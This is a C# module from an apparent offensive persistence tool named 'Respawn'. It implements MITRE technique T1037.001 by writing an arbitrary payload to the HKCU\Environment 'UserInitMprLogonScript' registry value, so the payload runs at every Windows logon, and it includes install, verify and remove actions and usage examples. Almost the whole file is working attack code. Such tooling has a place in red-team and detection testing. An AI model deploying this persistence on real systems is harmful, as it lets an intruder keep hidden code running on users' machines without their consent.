using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.LogonScript
{
    public class LogonScriptModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "logon";
        public string Name        => "Logon Scripts";
        public string Mitre       => "T1037.001";
        public string Description => "Persist by abusing the `UserInitMprLogonScript` registry value to automatically execute a hidden payload during the Windows logon sequence, right before the desktop shell fully loads.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath   = @"Environment";
        const string ValueName = "UserInitMprLogonScript";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {

            TechniqueHelpBuilder.RenderShowHelp("p2", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Command to execute (exe, script, or built-in tool)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t logon -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t logon -a install -p \"C:\\p.bat\"");
            // TechniqueHelpBuilder.RenderExample("Respawn -t logon -a install -p \"powershell.exe -File C:\\p.ps1\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t logon -a verify");
            TechniqueHelpBuilder.RenderExample("Respawn -t logon -a remove");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return LogonScriptKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Fail("Failed to open HKCU\\Environment registry key.");

                var existing = regKey.GetValue(ValueName);
                if (existing != null)
                    return TechniqueResult.Exists($"UserInitMprLogonScript already set to '{existing}'.");

                regKey.SetValue(ValueName, ctx.Payload);
                return TechniqueResult.Ok($"Installed logon script -> '{ctx.Payload}'");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Fail("Failed to open HKCU\\Environment registry key.");

                var existing = regKey.GetValue(ValueName);
                if (existing == null)
                    return TechniqueResult.NotFound("UserInitMprLogonScript value not found.");

                regKey.DeleteValue(ValueName);
                return TechniqueResult.Ok("Removed logon script.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return TechniqueResult.Fail("Failed to open HKCU\\Environment registry key.");

                var value = regKey.GetValue(ValueName)?.ToString();
                if (value == null)
                    return TechniqueResult.NotFound("UserInitMprLogonScript value not found.");

                return TechniqueResult.Ok($"Verified logon script -> '{value}'");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <payload>.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}